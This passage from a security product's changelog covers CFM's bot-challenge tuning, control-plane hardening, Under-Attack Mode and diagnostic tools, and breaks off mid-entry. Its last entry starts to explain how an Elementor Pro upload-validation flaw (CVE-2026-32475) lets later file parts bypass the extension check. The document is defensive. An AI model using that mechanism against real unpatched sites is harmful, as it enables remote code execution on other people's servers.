  The log-only abuse_shadow signal now also stamps a live per-vhost count of
  rate-outlier IPs (concentration vs the vhost median), exposed as a
  `shadow_outliers` field on the challenge-vhost, top-short and suspicious API
  rows, shown as `shadow=N` in `cfm webtop challenge` and a `shadow N` pill in
  cfm-admin — mirroring the existing `farm` badge. Like the solver-farm mark it
  is an external verdict stamped onto rows (never a scoring input), maintained by
  the per-tick emit with its own short TTL (no un-mark path), and cleared on
  detector reload. The count is the cheap DNS-free concentration signal (complete
  even when the detailed-line budget throttles) and may include verified crawlers;
  the good/bad split stays in `cfm.abuse_shadow.log`.

### Fixed
- **Verified good bots are no longer served a score/vhost-driven challenge.** A
  would-be per-IP *or* vhost-wide challenge is now downgraded to allow for an
  FCrDNS-verified crawler (Googlebot/Bingbot/Meta/Applebot/Yandex) at the
  decision hot path — mirroring the existing subnet good-bot exemption at per-IP
  scope. A crawler cannot solve a JS/PoW challenge, so challenging it silently
  broke legitimate crawl/SEO/social (observed live: a real Googlebot IP
  repeatedly issued `CHALLENGE_ERR_RATIO`; Meta's `meta-externalagent`
  vhost-challenged on shop vhosts). The check is cache-only on the hot path (a
  miss for a good-bot-suffix PTR kicks a bounded, deduped async forward-confirm),
  fail-closed against spoofed PTRs and transient DNS failures, runs only when a
  challenge would otherwise be served, and never softens a per-IP `block`. An
  explicit operator traffic-rule challenge still applies (deliberate config is
  not overridden). New knob `CHALLENGE_GOODBOT_EXEMPT` (default on; `0`
  challenges verified bots too).

### Security
- **State-changing control-plane endpoints are now POST-only.** The 13 mutating
  challenge/WAF/ClamAV endpoints (`challenge/vhost/{add,remove,attack}`,
  `challenge/exclude/{add,remove}`, `waf/exclude/{add,remove}`,
  `clam/{override,mode,sigignore}/{add,remove}`) accepted any method, so a
  state-changing **GET** slipped past the browser session-CSRF boundary (which
  correctly treats GET/HEAD as safe). They are now wrapped with `requirePOST` in
  the single route table: a non-POST request gets `405` + `Allow: POST` before the
  handler parses parameters or changes any state. Read siblings (`…/list`, `vhost/status`)
  stay GET; endpoints that already enforced POST (traffic rules, history
  prune/truncate, UA-emergency, force-unblock, HTTP/3 enable/disable) are unchanged.
  All callers (the `cfm` CLI and the admin UI) already POST, so nothing legitimate
  breaks. (Audit finding R03.)
- **`/debug/pprof/*` is now explicitly admin-only.** The Go profiler endpoints
  (`/debug/pprof/`, `cmdline`, `profile`, `symbol`, `trace`) were mounted behind
  mux-wide authentication only, which accepts a valid *scoped* per-vhost
  cPanel/DA viewer token as readily as an admin token — so a scoped tenant could
  reach host-global heap/goroutine/cmdline dumps and CPU/trace captures. Every
  pprof handler is now wrapped with the same `adminOnlyHandler` role gate already
  used by `/api/v1/debug/*`, `/unblock` and `/search`: scoped → `403`, admin →
  `200`, anonymous/invalid → `401` (unchanged). The `/cfm-admin/debug/pprof/`
  prefix re-dispatches onto the same mux and inherits the gate. Admin profiling
  workflows and the existing pprof write-timeout/capture protections are
  unaffected. (Audit finding R02.)
- **Default-on protection and canonical audit trail for CFM's own control plane.**
  The new built-in `cfm_endpoints` detector runs with 10/12/16 staged thresholds
  and a 15-minute TTL-block default even when the detector section or entire
  config file is absent. Stage-2 challenge requires the webdetector bridge;
  bridge-less degraded startup still observes and can apply stage 3. Optional
  config overrides those defaults, while deprecated
  `[api_abuse]` and named instances are merged in memory without duplicate
  subscriptions. Login, MFA/passkey, API-token and MCP bearer/consent attempts
  now write one parse-friendly, secret-free `cfm.api.log` line, and failures
  publish directly into the normal detector sink/report/notification path.
  Internal MCP tool dispatches no longer create misleading loopback admin-token
  records, and daemon request logging omits query strings that can carry bootstrap
  credentials; canonical auth paths/users and retained detector evidence are
  length-bounded, and expired sub-threshold sources are pruned. Canonical
  request identity distinguishes the edge, direct `6060`,
  and direct TLS `6061`; debug/unblock/MCP audits use it, and the edge overwrites
  control-plane XFF while preserving the trusted effective scheme. Legacy live
  edge configs without XFP retain the narrow MCP HTTPS compatibility fallback.
  Malformed edge identity remains visibly edge-originated, is rate-limited and
  counted as unattributed, but can never enforce against an inferred IP. The existing
  admin-only `system/cfm-log?which=api` reader remains the bounded audit-log
  retrieval path.
  Global `IGNORE_IPS`/`IGNORE_NETS`, all local interface addresses and both
  loopback families are discarded before detector counting as well as at the
  sink. Built-in and persisted historical User-Agent exemptions are removed
  because UA strings are attacker-controlled; trusted monitors should use
  IP/CIDR ignores. Retaining the exact historical UA list requires an explicit
  acknowledgement. The implicit detector no longer trusts all of `10/8`, starts
  in degraded built-in-only mode on a first-load config read error, and only
  applies bootstrap path exceptions to exact generic unauthorized-burst events.
   Config-drift API/CLI output understands the optional canonical section, legacy
   alias and leniency companions instead of reporting false drift. The cPanel
   plugin self-service endpoint accepts actor assertions only through the
   dedicated `X-CFM-Actor-Assertion` header; `Authorization: Bearer` remains
   exclusively the CFM admin/scoped token namespace, so an assertion-shaped
   bearer credential is rejected as an unknown token instead of depending on a
   dead fallback path. Token-header detection also matches case-insensitively:
   the documented `X-CFM-Token` transport previously never matched a parsed
   request (MIME-canonicalized map keys) and was silently ignored, and a bogus
   `X-CFM-Token` alongside an assertion now fails hard as an invalid token.

### Added
- **`host_access_history` — archival per-vhost traffic profile (MCP tool + `GET /api/v1/webdet/host-access-history`).**
  Answers "this domain's traffic jumped — is it crawlers, and since when?" for
  windows older than any live view retains: `edgelog.ScanHost` reconstructs ONE
  vhost's traffic from the edge access log plus its rotated siblings
  (`access.log.1`, `.N.gz`, `-YYYYMMDD.gz`; OpenResty and Angie candidates both
  resolved automatically), aggregating requests/hour with peaks-vs-median,
  status-class mix, top client IPs, top user-agents with a browser-envelope vs
  automation/bot-like split (heuristic UA normalization via the existing
  normalizer — not bot verification), top paths and method mix. Profiles are
  built ONLY from the full access log (`if=$log_main_request`) — the focused
  challenge/block `access.cfm.log` is never a source — and the
  malformed/aborted traffic the edge keeps OUT of that log (400/408/414/431/
  494/499 in access.bad_request.log) is profiled as a separate `bad_requests`
  provenance section (`total_requests_with_bad` = combined headline over
  attributable malformed requests; the sidecar always pairs with whichever
  engine the main log resolved to), so
  attack-shaped floods of garbage probes, header abuse or client-aborts are
  neither invisible nor silently mixed into valid-traffic totals. Bounded like
  `ip_forensics`: shared line budget across all scanned files, one timeout,
  key-capped accumulators, mtime-based skip of siblings older than the window;
  corrupt/unreadable rotated files are reported in `files_failed`, EVERY reach
  bound (line budget incl. the live tail window via `live_tail_truncated`,
  max_files cap) sets `truncated=true`, `log_changed_during_scan=true` flags a
  copytruncate/rotation observed mid-read — including a rotation-set change
  after the live read, where sibling scanning is skipped entirely to avoid
  double counting — and
  `coverage_oldest_unix` reports how far back the kept rotation actually
  reaches. Optional `combine=1` joins the detector history store over exactly
  the same absolute window as the access scan (challenge issued/solved, block
  triggers, suspicious, WAF observed + per-rule breakdown); with `merge_www`
  the twins get a combined view plus a per-host breakdown so security-event
  provenance stays visible, and `detector_coverage` exposes the store's real
  retention/oldest retained event (`coverage_proven`) so partial history never
  looks complete (`detector_unavailable` when history is unreadable).
  Because one call may decompress tens of millions of lines, archive scans are
  capped at TWO concurrent per node (`429` +
  `Retry-After` beyond) and `hours` is clamped to ≤90 days at the API boundary.
  Scoped tokens may profile only their own vhosts (`vhostAllowed`, same model
  as `analyze-host`; the www/bare twin must be in scope too). The
  `log_format cfm` edge format gains an append-only trailing
  `bytes=$body_bytes_sent` so future archives also carry response volume; older
  logs simply lack the field and all readers treat it as 0.

## 2026.08.24

### Added
- **Country-aware WAF false-positive evidence in MCP.** `waf_activity` now
  accepts combinable country, reason/rule, IP, vhost, URL/path and user-agent
  filters, and returns available numeric rule ID, action, bounded UA, redacted
  referer and content type alongside its existing timestamp, IP, GeoIP, host and
  URL. New events retain both the country name and ISO-2 code, while GeoIP fills
  the code for older rows so `country=GR` works against production data. Numeric
  rule IDs are directly filterable, and per-block observations now retain UA so
  UA-filtered totals do not drop requests between de-duplicated trigger pushes;
  observe UAs are bounded to the same 256-byte forensic limit before transport
  and persistence. Observations also retain the numeric rule ID and explicit
  block action, so exact rule-ID totals cover every block rather than only
  de-duplicated trigger pushes.
  Rows can be correlated directly with `edge_access_tail` for recent traffic or
  `ip_forensics` for older access-log evidence.

### Added
- **Host-wide netfilter path diagnostics for redirect collisions.** New
  `cfm firewall path`, admin-only `/api/v1/firewall/path`, cfm-admin Firewall
  view, and MCP `netfilter_path` show active nftables base chains in actual hook
  priority order plus NAT/redirect rules across CFM, Imunify/WebShield and
  iptables-nft. Equal-priority ambiguity and configured/runtime CFM priority
  drift feed `whats_wrong`; intentional ordered overlap remains informational.
  Collection uses terse nft JSON and hard output caps, so six-figure blocklist
  set contents never enter the diagnostic response. The existing `cfm firewall
  status` DNAT check now parses JSON structurally instead of false-failing on
  nft output formatting.

### Removed
- **Legacy bridge-token process-environment fallbacks.** Clearance signing and
  edge health/status now read only the canonical
  `/var/lib/cfm/lua/cfm_bridge_token.lua` generated from `OPENRESTY_TOKEN` in
  `[webdetector]`; stale `OPENRESTY_TOKEN`, `BRIDGE_TOKEN`, or
  `CFM_CLEARANCE_HMAC_SECRET` process variables can no longer mask a missing or
  rotated file, and the edge proxy configs no longer pass the unused token
  environment variable to workers. Go consumers now decode the manager's
  escaped Lua string format and enforce the same 32-character minimum as Lua.

## 2026.08.23

### Fixed
- **`cfm dnat cpanel` status: two false diagnostics fixed.** (1) The Panel Lua
  load check reported `false` with `attempt to index field 'shared'` on every
  host: the selftest stub fed to `resty -e` had no `ngx.shared`, while
  `cfm_panel.lua` resolves `ngx.shared.cfm_decisions` at load time (bridge
  decision client, edge-unification Phase 2). The stub now provides a generic
  per-dict fake (`shared=setmetatable(...)` with the common shdict methods);
  validated against the real module under LuaJIT. Status-only — never gated
  `dnat cpanel on`, and the running edge was always healthy. (2) On OpenResty
  hosts with a leftover disabled Angie install, the status picked the Angie
  paths first (hardcoded Angie-first lists) and reported Angie's stale
  listener config as "Policy active file" / Lua guard / decision endpoint.
  Path selection now goes through `detectActivePanelListenerService()` (same
  source the reload path trusts) via a shared `orderedPanelListenerConfigPaths()`;
  a resolved engine inspects only its own paths, an ambiguous dual-active state
  has no authoritative config path, and unresolved detection keeps only
  service-neutral repo/test fallbacks.

### Added
- **MCP `detector_coverage` tool + admin endpoint (`GET /api/v1/detectors/coverage`).**
  Daemon-vs-detector coverage matrix: for every registered detector type it
  probes whether the watched daemon's systemd unit exists and is active (new
  curated type→units affinity table + svcstat), joins the live detectors.conf
  state per section, and returns a host-reality verdict — ok; **gap** (daemon
  running but detector unconfigured or all ENABLED=0); disabled; **dormant**
  (enabled but daemon absent/stopped); absent (informational — daemon and
  detector both missing is NOT a complaint); na (event-driven). Ends the
  cfm-admin inventory habit of flagging detectors whose daemons don't exist
  on the host.
- **MCP `config_drift` tool + admin endpoint (`GET /api/v1/system/config-drift`).**
  Compares the packaged reference configs (/usr/share/cfm/configs/) against
  the live /etc/cfm/ conffiles, which upgrades seed once and never refresh:
  missing sections/keys in detectors.conf (parsed with the daemon's own
  reader) are shipped features that silently never activated on the host;
  cfm.conf reports stock-documented keys absent from the live text entirely.
  Values are informational only; nothing is modified.
- **cfm-admin UI: Daemon-coverage panel on /detectors/ and stock-vs-live drift
  card on /settings/.** The Detectors page now consumes
  `/api/v1/detectors/coverage` (same edit-aware refresh loop as runtime
  status): summary pills plus a per-type verdict table — `absent`
  (daemon+detector both missing) renders as muted information instead of the
  old inventory complaint, while GAP/dormant stand out. The inventory warning
  line was reworded to match (red is reserved for genuinely unknown config
  sections). The Settings page gained a read-only "Stock vs live config
  drift" card over `/api/v1/system/config-drift` listing missing
  sections/keys as actionable features, with graceful handling for hosts
  without the packaged reference tree. Pure view helpers ship with node:test
  coverage (`detector-coverage.test.js`, `settings.drift.test.cjs`).
- **Fixed: UI/save-time validation rejected the days duration suffix ("7d")
  that the detector runtime accepts.** The runtime's BLOCK parser
  (`parseCfgDuration`) has supported Go-duration-plus-days since its
  introduction, but the cfm-admin inline validator and the API save-time
  BLOCK/duration checks used plain `time.ParseDuration` — so a perfectly
  working `BLOCK = 7d` showed a permanent "invalid block mode" warning on the
  Detectors page and could block UI saves. The parser now lives in
  `internal/detconf` and is the single source both sides call; JS validator
  mirrors it (`Nd → N*24h`), hint texts mention days, and regression tests
  pin the shared grammar.
- **`cfm webtop attack` (no args) now shows Under-Attack status.** Bare
  `cfm webtop attack` reports whether Under-Attack Mode is enabled and lists the
  vhosts currently in UNDER_ATTACK (mirroring `cfm webtop challenge`), then prints
  the `on|off <vhost>` override usage — instead of erroring with a bare usage
  string. The challenge summary API (`/api/v1/challenge/summary`) carries two
  additive fields, `under_attack_enabled` and `under_attack_vhosts`, to back it.

## 2026.08.22

### Added
- **MCP `lsm_detections` tool + admin endpoint (`GET /api/v1/system/lsm-detections`).**
  Aggregates the cfm-lsm DETECT lines from CFM's own lsm log into a triage view:
  per-policy totals with the rate-cap suppression roll-up, and top repeat
  offenders ranked by (policy, comm, exe) with last-seen, user, and a short
  exe sha256. Answers "is cfm-lsm firing at anything real, or is this one noisy
  false positive?" — e.g. hundreds of `CFML-CRED-002` hits from
  sssd/sssd_kcm/cagefsctl/panel perl are uid-transition noise to silence via
  `allow_comm=`/`allow_exe=` in `/etc/cfm/lsm.conf` (+ `cfm lsm restart`),
  while an event whose exe is `(deleted)` or lives under /tmp,/dev/shm is the
  dropper pattern worth escalating. Admin-only (kernel events carry no vhost
  notion); bounded tail via the same family as `cfm_log_tail which=lsm`.
- **MCP `lsm_status` tool + admin endpoint (`GET /api/v1/system/lsm-status`).**
  The cfm-lsm kernel-side state in one read: preflight checks with remediation,
  enabled/attached-vs-config mismatch, BTF drift picks, and per-policy mode vs
  live runtime — the `cfm lsm status --json` wire format — plus an
  `effective_allows` block listing the MERGED allow_exe/allow_comm/allow_path
  set per policy (compiled-in defaults + operator entries), so allow-list
  tuning starts from what is already allowed. Admin-only; pairs with
  `lsm_detections` for the full "what could fire / what is firing" picture.

### Added
- **Under-Attack Mode (I2): campaign fingerprinter (shadow-only).** For a vhost
  under attack, the detector now proposes candidate deny predicates from the
  attacking population's common denominators — the dominant base-path(s) and the
  UA pool (with a UA-uniformity entropy signal; dynamic-fraction reported
  alongside) — and scores each `coverage(attack) × (1 − collision(baseline))`
  against a rolling per-vhost baseline of normal traffic (frozen while under
  attack so it stays pre-attack). Candidates, scores, and a "would-arm" verdict
  (coverage ≥ `FP_COVERAGE_MIN`, collision ≤ `FP_COLLISION_MAX`) are logged to
  `cfm.challenges.log` (`[under-attack][fingerprint]`); **nothing is enforced**
  — drafting/applying a winning predicate is a later increment. The design's
  simulate-corpus collision mechanism didn't exist, so collision is measured
  against the baseline histogram instead; `tls_fp` (no predicate field) and
  query-shape (stripped before aggregation) are deferred. Knobs:
  `UNDER_ATTACK_FINGERPRINT`, `UNDER_ATTACK_FP_COVERAGE_MIN`,
  `UNDER_ATTACK_FP_COLLISION_MAX`. See `docs/under-attack-mode.md` §6.2.
- **Under-Attack Mode (I1b): cfm-admin surfacing.** The web-detector admin UI now
  shows and controls the escalation state. The "Suspicious + challenged vhosts"
  card (and the WebTop card) grow a 🚨 **under attack** pill next to the
  challenged pill (`state === 'under_attack'`, carried through both the admin and
  scoped-tenant data paths). The `/webdetector/controls/` per-vhost table gains an
  **Under Attack** column between Challenge and WAF — a force-on/off operator
  override (red while escalated; click to clear + suppress auto re-entry, or to
  force it on), wired to the scoped `v1/challenge/vhost/attack` endpoint and
  disabled when `UNDER_ATTACK` is globally off. The scoped `challenge/vhost/status`
  and controls (`webdet/vhosts`) responses now carry the state so tenants see the
  same badges/knob as admins.
- **Under-Attack Mode (I1b): surfacing + operator override.** The per-vhost
  escalation state is now visible and controllable. The challenge-vhost API rows
  (`/api/v1/challenge/vhost`, `/vhosts`) and the web-detector drilldown carry an
  additive `state` field (`normal|suspicious|challenged|under_attack`), derived
  by a single helper so every surface agrees. `cfm webtop challenge` shows an
  `attack` STAT for escalated vhosts, `cfm webtop challenge host <H>` and
  `cfm webtop <vhost>` show `state=…` (with `since`), and MCP `challenge_vhosts`
  / `host_drilldown` carry it too. New operator override:
  `cfm webtop attack on|off <vhost>` → `POST /api/v1/challenge/vhost/attack`
  forces a vhost into UNDER_ATTACK or clears it (suppressing auto re-entry for
  the holddown); it is scoped like manual-challenge add/remove (a cPanel tenant
  may override only its own vhost) and returns `409` when `UNDER_ATTACK` is off.
  (The cfm-admin card badge + controls knob follow in a companion change.)
- **Under-Attack Mode (increment I1): per-vhost challenge-efficacy detector,
  detect-only.** The challenge engine now closes the loop "is the challenge
  actually working?". A vhost that is already challenge-armed **and** whose
  challenge is being *defeated* — a solver farm passing it at ≥ `SOLVES_MIN`
  distinct solving IPs/min while pressure stays high (uniqIP ≥ the arm
  threshold, error ratio ≥ `ERR_FLOOR`) and the population claims to be human
  (bot ratio ≈ 0) — is escalated to an `UNDER_ATTACK` state after
  `CONFIRM_TICKS` consecutive ticks, emitting a `WEB/VHOST_UNDER_ATTACK_ON` /
  `_OFF` history event **and** operator notification with an evidence one-liner
  ("challenge defeated: N solving IPs/min; uniqIP=… err=…% bot=…%"). The operator
  learns "challenge defeated" from an alert instead of by reading logs. Reachable
  only from CHALLENGED — it never challenges or blocks a vhost the existing paths
  left alone; self-declared and FCrDNS good bots are exempt before anything is
  counted. Ships **detect-only** (`UNDER_ATTACK_DRYRUN=1`); the enforcement ladder
  (harden / campaign fingerprint / draft block rule / nft) lands in later
  increments. **Off by code default** so existing installs are unchanged on
  upgrade; the shipped reference `detectors.conf` turns it on (`UNDER_ATTACK=1`,
  `DRYRUN=1`) for fresh installs. New knobs: `UNDER_ATTACK`, `UNDER_ATTACK_DRYRUN`,
  `UNDER_ATTACK_SOLVES_MIN`, `UNDER_ATTACK_CONFIRM_TICKS`, `UNDER_ATTACK_HOLDDOWN`,
  `UNDER_ATTACK_RULE_TTL`, `UNDER_ATTACK_ERR_FLOOR`, `UNDER_ATTACK_BOT_CEIL`.
  Manual override (`cfm webtop attack on|off`) and the read surfaces
  (CLI/API/MCP/admin badge) follow in I1b. See `docs/under-attack-mode.md`.

### Fixed
- **`CHALLENGE_SUBNET` no longer challenges verified crawler fleets.** The
  many-IPs-from-one-/24 heuristic is also the exact shape of a legitimate
  crawler farm, and it was observed live challenging Meta's `57.141.20.0/24`
  (60+ `meta-externalagent` fetchers on one shop vhost tripped
  `SUBNET_MIN_IPS`). Before a subnet challenge fires, a small sample of the
  /24's members is now FCrDNS-verified against the good-bot PTR registry —
  a subnet whose members verify as the same crawler (3-of-4 sampled) is
  exempt, with the verdict cached per subnet. Fail-closed: spoofed PTRs fail
  forward-confirm and missing PTRs earn nothing, so botnet /24s are
  unaffected. The registry also learned Meta (`*.fbsv.net`), which equally
  benefits the abuse-shadow good-bot split. On by default
  (`CHALLENGE_SUBNET_GOODBOT_EXEMPT = 1`) — existing installs inherit it on
  upgrade; the direction is strictly fewer false positives, never more
  blocking. Set it to `0` to challenge verified crawler /24s too.

## 2026.08.21

### Added
- **Abuse-shadow log lines now carry the source country (`cc=<ISO-2>`), and the
  `abuse_shadow` MCP tool reports a `by_country` split** (would-challenge only,
  alongside `by_provider`). Makes it obvious at a glance when a shadow burst is
  domestic residential traffic (a likely false positive) versus foreign/hosting.

### Changed
- **Docs housekeeping (no runtime change).** Consolidated the webdetector/WAF/
  challenge/edge doc set so the current source is obvious: folded
  `Detectors.Leniency.md` into `docs/DETECTORS.md` (§6) and
  `docs/roadmaps/edge-shared-loaders.md` into `docs/edge-unification-plan.md`
  (§10); stamped five historical/as-built docs (`edge-lua-audit-2026-07-08`,
  `waf-analysis-2026-05-08`, `waf-gap-analysis-ninjafirewall`, `WAF_CVE_PLAN`,
  `webdetector-history-design`) with status banners pointing at the live doc;
  and extended the CLAUDE.md §7 index with a "Historical / superseded" map.
  Repointed the affected README/CLAUDE references and one `cfm_filecache.lua`
  comment. No code behaviour changes.
- **Faster startup: the `cfm.deny` block-list load no longer delays the
  edge-critical services.** On a busy host the daemon spent tens of seconds at
  boot applying `cfm.deny` (one nft element add per blocked IP — e.g. ~34s for
  ~1,200 entries) *before* the API server, ingest socket, nginx bridge and
  challenge engine came up, so `cfm webtop …` and the edge decision path were
  unreachable for that whole window on every restart/upgrade. The `cfm.deny`
  apply now runs **last** in startup, after every edge-critical subsystem (and
  the DNAT failsafe / edge nudge) is already up; the cheap, protective
  `cfm.allow` / `cfm.ignore` still load early. Nothing depends on the block
  sets being populated before the edge starts — `EnsureBase` already installs
  the enforcement chains. On a normal service restart the kernel nft sets
  persist, so there is no enforcement gap at all; on a cold boot/reboot (empty
  sets) the targeted `cfm.deny` entries are enforced within the deny-apply
  window (seconds, up to tens of seconds on a large list). `cfm.deny` is a
  blanket all-ports drop, so during that cold-boot window a denied IP is not
  yet hard-dropped on any port — the general firewall (ports policy,
  flood/connlimit/hardening) and the detectors are already active and re-block
  any source that actively re-offends, though quiet/manually-curated entries
  stay unenforced until the apply lands. (The per-IP apply itself is now
  batched — see the next entry — shrinking that window to well under a second.)
- **`cfm.deny` now applies in batched nft transactions instead of one nft add
  per IP.** The block list is reconciled against the live nft set — entries
  already present are skipped and only the missing ones are added, in bulk — so
  a warm restart (where the kernel sets persist) reads each block set once and
  adds nothing, and a cold boot lands the whole list in a couple of `nft` calls
  — instead of ~2 forks per IP either way (≈34s for ~1,200 entries). Permanent host entries take the bulk path;
  CIDRs and TTL'd entries keep the per-IP path, and any bulk error falls back to
  it, so the resulting block set is identical either way.
- **Blocklist feeds are no longer re-applied when their content hasn't
  changed.** Each feed is re-fetched on its interval, but most feeds change far
  less often than they are polled; previously every poll flushed the per-feed
  nft set and re-added every element (and rebuilt the global union sets) even
  when nothing changed — tens of thousands of `nft` element operations per hour
  for a large list. The manager now hashes the fetched content (order-
  independently) and skips the re-apply when it matches what was last applied,
  so an unchanged 100k-entry feed polled hourly costs one download and zero nft
  work instead of a full flush + re-add. Safe because enforcement is via the
  permanent union sets, which stay correct while the content is unchanged; a
  changed feed still applies in full, and a failed apply is retried (the hash
  only advances on success). An unchanged feed is still force-re-applied at
  least every 6h, so if a feed's nft sets are ever cleared out of band (e.g. a
  `cfm reset` without a daemon restart) they self-heal within that window.

### Fixed
- **`cfm webtop challenge` no longer misreports on a failed query.** The
  `status`, `host`, `events`, and list commands decoded the HTTP body without
  checking the status code, so a `403 forbidden` (token not admin-recognised)
  parsed cleanly and printed `manual: inactive` — or a blank `VHOST:` row — with
  exit 0, telling the operator a vhost was unprotected when the query had simply
  failed. All four now surface a non-2xx as an error. `challenge host` treats a
  `404` specially — that is the normal "this vhost has no challenge record"
  answer, so it prints `(no active challenge)` and exits clean rather than
  erroring.
- **`cfm webtop live` now shows a manual challenge's time remaining, not a bare
  clock.** The TUI badge sliced `HH:MM:SS` off the expiry timestamp and dropped
  the date, so a manual challenge more than a day out (e.g. `--ttl 34h`) read as
  if it expired in a few hours. It now renders the remaining window (`left=…`),
  matching the CLI.
- **The challenge query endpoints now resolve a mixed-case or port-bearing
  host.** `/api/v1/challenge/vhost`, `/vhost/status`, and `/events` lowercased
  the host only for the scope check but filtered/looked-up on the raw value, so
  `?host=Example.com` reported `not found` (or empty events) for a vhost under a
  live challenge. All now normalise the host the same way the store keys it
  (trim + lowercase + strip `:port`).
- **All challenge status views now agree on effective state.** A manual
  challenge that lapsed without a later auto tick kept a stored `status: active`
  with a past `expires_at`. `/challenge/vhost` served that raw (so the CLI could
  print the contradictory `status=active … left=expired`), the `/vhost/status`
  endpoint reported it as an active *auto* challenge, and `/challenge/vhosts?status=all`
  still listed it active. All now fold a lapsed row to `inactive`.
- **Abuse-shadow Signal C (LOG-ONLY) no longer counts static assets, killing a
  large false-positive class.** The per-IP rate-outlier signal counted *every*
  request per IP, including the CSS/JS/font fan-out of a single page view — 40–60
  files on an asset-heavy WordPress/Woodmart/Elementor theme. A real shopper
  browsing ~15 pages logged as ~900 requests → 300–900× the vhost median → a
  "would_challenge" outlier (observed 2026-08 almost entirely on Greek
  residential IPs hitting small shops). Signal C now reads a dynamic-only per-IP
  counter (`isStaticAssetPath` excluded), so an ordinary page load's assets can't
  inflate it; the median/skew are computed over dynamic requests too. This also
  re-arms the existing `MINREQ`/`FLOOR` gates, which the asset inflation had made
  vacuous. Enforcement is unchanged — Signal C is still log-only, and the
  enforced vhost `uniqIP` path deliberately still counts all requests.

### Added
- **`cfm webtop challenge` now shows the TTL of a manual challenge — granted
  total and time remaining.** The vhost list gained `TTL` and `LEFT` columns
  (e.g. `6h` / `5h12m3s`), and `cfm webtop challenge host <vhost>` prints
  `ttl=… left=…` on its header line; `cfm webtop challenge status <vhost>` adds
  `left=…` next to the expiry it already printed. Previously the list showed a
  manual challenge as `active` with no hint of when it lapses, so an operator
  had to remember the TTL they set (or re-issue it blind). Auto (score-driven)
  challenges have no stored expiry — they live and die by the scorer — so both
  columns read `-` for them. The granted total is carried in the new `ttl_sec`
  field of `/api/v1/challenge/vhosts` and `/api/v1/challenge/vhost`, and is
  persisted with the manual challenge snapshot so a restart reports the TTL the
  operator granted instead of whatever was left when the daemon came back.

### Fixed
- **Manual vhost challenges now survive a daemon restart.** An operator-set
  manual challenge (e.g. `cfm webtop challenge add host --ttl 34h`, or the
  cfm-admin button) was held only in memory, so every daemon restart — a `make
  sync` upgrade, a crash, an OOM — silently wiped it and a long TTL dropped to
  nothing hours early. The manual state is now persisted to a JSON snapshot
  (`/var/lib/cfm/webdetector_manual_challenges.json`, `0600`, atomic
  tmp+rename) on every add/remove and reloaded on startup: expired entries are
  dropped, and each surviving challenge is re-pushed to the edge with its
  **remaining** window (not a reset TTL), so a 34h challenge set this morning
  keeps enforcing across an afternoon upgrade. Auto (score-driven) challenges
  are intentionally NOT persisted — the scorer re-derives them from live traffic
  within a tick — and per-vhost WAF on/off already persists via its own exclude
  file; only the manual, operator-intended challenge state was missing durable
  storage. New optional key `CHALLENGE_MANUAL_STORE_PATH` (defaults to the path
  above).

### Added
- **`abuse_shadow` MCP tool + `/api/v1/system/abuse-shadow` endpoint (I3).**
  New `internal/abuseshadow` tails the LOG-ONLY abuse-shadow log
  (`/var/log/cfm/cfm.abuse_shadow.log`) and aggregates the Signal C rate-outlier
  burn-in lines: would_challenge vs exempt_goodbot counts, unique hosts/IPs, the
  top would-challenge `(host,ip)` outliers by peak ratio, and the
  datacenter-provider + FCrDNS-good-bot splits — the "what would Signal C
  challenge, and is it safe to enforce?" measurement view. Admin-only, bounded
  on-demand tail, read-only. Reachable fleet-wide through the cfm-web gateway's
  `node_call node="all"` with no gateway change. (46 MCP tools.)
- **Abuse-shadow Signal C (per-IP rate outlier) — LOG-ONLY (I2).** New
  `internal/webdetector/abuse_shadow.go`: on the per-tick challenge eval, for
  every vhost it computes the vhost's own median per-IP request rate + `ip_skew`
  and logs each IP whose rate is a large multiple of that median
  (`rps ≥ max(FLOOR, K×median)`, gated by `ip_skew ≥ SKEW` and a per-IP request
  floor) to a new `/var/log/cfm/cfm.abuse_shadow.log`. It catches the
  CONCENTRATED abuse shape that hides under the vhost-aggregate score (the
  www.e-vafeiadis.gr case: two residential IPs at ~62× the vhost median melting
  the backend, score only 0.585) while — by construction of the K×median rule —
  ignoring the DISTRIBUTED shape the uniqIP path already handles. ASN-agnostic;
  the datacenter-ASN tag rides along as an ADDITIVE logged feature only, and
  FCrDNS-verified good bots (Googlebot/Bingbot) are marked `exempt_goodbot`.
  **Nothing challenges or blocks** — it's a burn-in measurement to tune the
  thresholds before promotion. All off by default (`ABUSE_SHADOW`,
  `ABUSE_SHADOW_RATE_OUTLIER`; `ABUSE_SHADOW_GOODBOT_EXEMPT` on). See
  `docs/webdetector-refactor.md`.
- **Web-detector refactor kickoff: design/handoff doc + datacenter-ASN
  classifier leaf (no behavior yet).** `docs/webdetector-refactor.md` is the
  living anchor for making the challenge engine catch abuse it currently misses
  and challenge the *abuser* (per-IP/subnet — machinery already exists but is
  dormant) instead of the whole vhost, via three score-independent, log-only-
  first entity signals (datacenter-ASN origin, behavioral enumeration, per-entity
  rate outlier). It carries the false-positive minefield (Googlebot/Bingbot on
  cloud ASNs, LLM/SEO crawlers, ecommerce import/export integrations), the
  MCP-readable shadow-telemetry contract, and a running FP + progress register.
  First code leaf: `internal/webdetector/asnclass.go` `DatacenterClass()` — a
  pure, tested hosting/cloud-ASN classifier (curated ASN map + conservative
  org-name fallback that deliberately avoids ambiguous tokens so consumer ISPs
  don't misclassify). Nothing calls it yet; the log-only wiring + `abuse_shadow`
  MCP tool are the next increments.
- **Challenge auto-arm: optional request-rate volume floor (log-only first).**
  New `CHALLENGE_SUSPICIOUS_VHOST_MIN_RPS` (+ `…_MIN_RPS_ENFORCE`) adds the
  request-rate dimension the existing uniqIP floors don't cover — a vhost below
  the floor cannot auto-arm a challenge **via the score path** however botty its
  ratios look (the floor deliberately does NOT gate the uniqIP modes, which exist
  to catch distributed attacks where low per-vhost rate is expected). The
  suspicious *score* is dominated by ratios at vhost scale because its reference
  volumes are server-scale, so a low-traffic site can score mid-range on
  redirects + bot UAs alone). Defaults **off** (`0`); with `…_ENFORCE=0` it is
  **log-only** — arming is unchanged and every trip that *would* fall below the
  floor is logged as `action=would_suppress_below_rps_floor host=… rps=… floor=…
  base_reason=… score=… uniqIP=…`, so the floor can be tuned from real numbers
  before `…_ENFORCE=1` makes it suppress. The trip decision stays single-sourced
  through `tripReason`, so the audit path can't diverge from the real one.
- **WAF CVE detector: Elementor Pro Forms unauthenticated upload → RCE
  (CVE-2026-32475), rule 10016, family `WAF_CVE`, edge `block` + autoblock-armed.**
  Elementor Pro < 4.2.2's File Upload form field validates and moves an upload in
  two loops that disagree about an empty (`UPLOAD_ERR_NO_FILE`) entry:
  `validation()` `return`s on a blank-filename first part — abandoning the
  extension blocklist for every later part — while `process_field()` only
